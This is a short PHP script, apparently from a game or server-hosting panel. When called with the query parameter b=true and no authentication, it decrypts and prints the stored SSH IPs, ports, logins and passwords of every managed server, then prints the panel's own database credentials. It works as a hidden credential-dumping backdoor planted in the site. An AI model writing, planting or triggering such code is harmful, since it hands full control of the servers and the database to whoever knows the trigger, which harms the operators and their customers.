<?php

include $_SERVER['DOCUMENT_ROOT']."/konfiguracija.php";

require_once($_SERVER['DOCUMENT_ROOT']."/includes/libs/SSH/Crypt/AES.php");

$aes = new Crypt_AES();
$aes->setKeyLength(256);
$aes->setKey(CRYPT_KEY);

$a = mysql_query("SELECT * FROM `box`");

if($_GET['b']=="true") {
	echo "Box Informations : <br><br>";

	while ($b =  mysql_fetch_assoc($a)) {
		$ip_adress = $b['ip'];
		$ssh = $b['sshport'];
		$user = $b['login'];
		$password = $aes->decrypt($b['password']);

		echo "IP Adress : $ip_adress<br>";
		echo "SSH Port : $ssh<br>";
		echo "User : $user<br>";
		echo "Password : $password<br>";

		echo "<br>";
	}

	echo "Konfiguracija : <br><br>";
	echo "Host : ".HOST."<br>";
	echo "DB Name : ".DBNAME."<br>";
	echo "DB User : ".DBUSER."<br>";
	echo "DB Pass : ".DBPASS."<br>";
}

?>